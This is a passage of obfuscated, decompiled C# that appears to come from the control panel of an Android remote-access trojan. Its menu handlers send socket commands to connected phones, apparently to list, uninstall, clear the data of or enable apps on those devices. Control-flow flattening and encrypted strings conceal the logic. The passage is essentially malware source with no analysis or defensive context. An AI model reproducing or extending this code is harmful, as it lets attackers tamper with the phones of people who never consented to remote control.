            int b = (int) backColor.B;
            brush2 = (Brush) new SolidBrush(Color.FromArgb(170, r, g, b));
            num1 = (int) num3 * 663142485 ^ 1168415555;
            continue;
          case 3:
            goto label_14;
          case 4:
            count = this.DGV0.Rows.Count;
            num1 = (int) num3 * 411623503 ^ 1993062709;
            continue;
          case 5:
            e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int) defaultColorForeground.R, (int) defaultColorForeground.G, (int) defaultColorForeground.B)), 0, 1, this.BoxTitle.Width, 1);
            num1 = (int) num3 * -1400707317 ^ 1370595615;
            continue;
          case 6:
            int num4 = this.BoxTitle.Height == checked (size.Height + 3) ? 338743653 : (num4 = 1479552514);
            num1 = num4 ^ (int) num3 * 1240988547;
            continue;
          case 7:
            str2 = EXGuarder.\u003202F6725 + Conversions.ToString(this.DGV0.SelectedRows.Count);
            defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            num1 = (int) num3 * -1526813706 ^ 405199663;
            continue;
          case 8:
            e.Graphics.DrawString(str1 + Strings.Space(10) + str2 + Strings.Space(10), Settings.f, brush1, 0.0f, 2f);
            size = TextRenderer.MeasureText(EXGuarder.\u0033453555B, Settings.f);
            num1 = (int) num3 * -1847061614 ^ -321086528;
            continue;
          case 9:
            rect = new Rectangle(0, 2, this.BoxTitle.Width, checked (TextRenderer.MeasureText(str1 + Strings.Space(10) + str2, Settings.f).Height + 5));
            num1 = (int) num3 * 1809090702 ^ -1793325060;
            continue;
          case 10:
            this.BoxTitle.Height = checked (size.Height + 3);
            num1 = (int) num3 * 814164775 ^ -1836587127;
            continue;
          case 11:
            goto label_1;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void AngelAndroidForm_Activated(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void BoxTitle_Resize(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (((Build) this).classClient == null)
        return;
label_1:
      int num1 = 1535768747;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~-(-(-1828737965 * ~((361721101 - 1208884276) * -1069576611) - (((-1370877285 ^ ~1915149825) + (2028059882 * 1421582445 + ~-1693714763) + (-1021435356 - 565983449 - -1039055784 + (501975849 - 902497186 - 839014625))) * -356748361 - num2)) * -196080183)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((Build) this).classClient.SendMessage(new object[4]
            {
              (object) ((Build) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u0032F5D0219 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00364153E6A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Accept.Apps + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034A2E5E24 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u0034F322634),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00349357654),
              (object) ((Build) this).classClient
            });
            num1 = (int) num3 * -1838301058 ^ 1052493961;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -140777989;
      while (true)
      {
        int num2 = num1;
        uint num3;
        TcpClient client;
        string str;
        object[] ParametersObjects;
        int num4;
        int index;
        switch ((num3 = (uint) ~(~-1539048661 + (-901256630 ^ -1390855642) - -(~~((-337246587 ^ 925026348) - -2033797643) + (-243448825 - (~1261965228 ^ 1331666517 - 379122975) ^ 704105781) - num2 - 1615160981 * (936610702 ^ 17846231 ^ ~2101916292 ^ -2040382101)) ^ 663716795 - 1334436153)) % 11U)
        {
          case 0:
            num1 = (int) num3 * -2041166957 ^ 634400983;
            continue;
          case 1:
            checked { index += -1; }
            num1 = -209939922;
            continue;
          case 2:
            ((Build) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * -1098076978 ^ -503727594;
            continue;
          case 3:
            goto label_1;
          case 4:
            int num5;
            num1 = num5 = index >= 0 ? 632901102 : (num5 = -680390400);
            continue;
          case 5:
            goto label_13;
          case 6:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((Build) this).classClient).myClient;
            num1 = (int) num3 * -1592214599 ^ -1845378924;
            continue;
          case 7:
            string[] strArray = ((Data) ((Build) this).classClient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034E542E62 + str + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Build) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00325193774),
              (object) ((Build) this).classClient
            };
            num1 = (int) num3 * -1051212770 ^ 1528573513;
            continue;
          case 8:
            num4 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -1137245898 ^ -138128511;
            continue;
          case 9:
            index = num4;
            num1 = (int) num3 * 639652957 ^ -421953212;
            continue;
          case 10:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value);
            int num6;
            num1 = num6 = ((Build) this).classClient == null ? -703919154 : (num6 = -747047272);
            continue;
          default:
            goto label_14;
        }
      }
label_13:
      return;
label_14:;
    }

    private void ClearAppDataToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = -380423226;
      TcpClient client;
      int index;
      int num2;
      string str;
      string[] strArray;
      object[] ParametersObjects;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (~((num1 * -1172263603 ^ 32758277 * -1701908642 + ~-1487485904 ^ -~-1727148196 ^ -1688052349) + (-320233353 * 1833289953 + 409098549)) - -1441157094)) % 13U)
        {
          case 0:
            int num4;
            num1 = num4 = index >= 0 ? 498456881 : (num4 = 1526982107);
            continue;
          case 1:
            index = num2;
            num1 = (int) num3 * -157502811 ^ -599157107;
            continue;
          case 2:
            num1 = (int) num3 * -689696349 ^ -956090524;
            continue;
          case 3:
            strArray = ((Data) ((Build) this).classClient).Keys.Split(':');
            num1 = (int) num3 * -1438850932 ^ -351843705;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00367581952 + str + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Build) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0035D341E1E),
              (object) ((Build) this).classClient
            };
            num1 = (int) num3 * 1001991406 ^ 1236852620;
            continue;
          case 5:
            int num5 = ((Build) this).classClient == null ? -1553185754 : (num5 = 2076440514);
            num1 = num5 ^ (int) num3 * -2118014964;
            continue;
          case 6:
            goto label_1;
          case 7:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -305507287 ^ 991919202;
            continue;
          case 8:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value);
            num1 = -86784661;
            continue;
          case 9:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((Build) this).classClient).myClient;
            num1 = (int) num3 * 1466674667 ^ 1377312246;
            continue;
          case 10:
            goto label_15;
          case 11:
            checked { index += -1; }
            num1 = -540132395;
            continue;
          case 12:
            ((Build) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 46952440 ^ 963574746;
            continue;
          default:
            goto label_16;
        }
      }
label_15:
      return;
label_16:;
    }

    private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (this.DGV0.SelectedRows.Count <= 0)
        return;
label_1:
      int num1 = 1989775122;
      int num2;
      int index;
      string[] strArray;
      TcpClient client;
      string str;
      object[] ParametersObjects;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ~~~(num1 - ((~210921853 ^ -351141854 - 1831027833) - ((-1143646864 ^ -1137318552) + (264191699 ^ -682642491)) - (---1209121574 + (-1335120905 * -536935449 ^ -987818936 - 605681179))) * -1495658305)) % 12U)
        {
          case 0:
            goto label_1;
          case 1:
            checked { index += -1; }
            num1 = 1327957112;
            continue;
          case 2:
            strArray = ((Data) ((Build) this).classClient).Keys.Split(':');
            num1 = (int) num3 * -1395239784 ^ 585393856;
            continue;
          case 3:
            str = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[index].Index].Cells[2].Value);
            num1 = 1432238563;
            continue;
          case 4:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0033B3D4322 + str + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((Build) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003140A620F),
              (object) ((Build) this).classClient
            };
            num1 = (int) num3 * 1521475182 ^ 1190203813;
            continue;
          case 5:
            goto label_14;
          case 6:
            // ISSUE: reference to a compiler-generated field
            client = ((Data._Closure\u0024__) ((Build) this).classClient).myClient;
            num1 = (int) num3 * -399385952 ^ 1429840646;
            continue;
          case 7:
            index = num2;
            num1 = (int) num3 * 1998789070 ^ -2092865318;
            continue;
          case 8:
            int num4;
            num1 = num4 = index >= 0 ? 574437781 : (num4 = 775757675);
            continue;
          case 9:
            int num5 = ((Build) this).classClient == null ? -1863927496 : (num5 = -426096203);
            num1 = num5 ^ (int) num3 * -1408139085;
            continue;
          case 10:
            num2 = checked (this.DGV0.SelectedRows.Count - 1);
            num1 = (int) num3 * -149772500 ^ -502642135;
            continue;
          case 11:
            ((Build) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * -1457146109 ^ -785074850;
            continue;
          default:
            goto label_15;
        }
      }
label_14:
      return;
label_15:;
    }

    private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
    {
      this.BoxTitle.Invalidate();
    }

    private void DGV0_SelectionChanged(object sender, EventArgs e) => this.BoxTitle.Invalidate();

    static Applications() => Build.\u0024I = (Applications._Closure\u0024__) new Applications();
  }
}
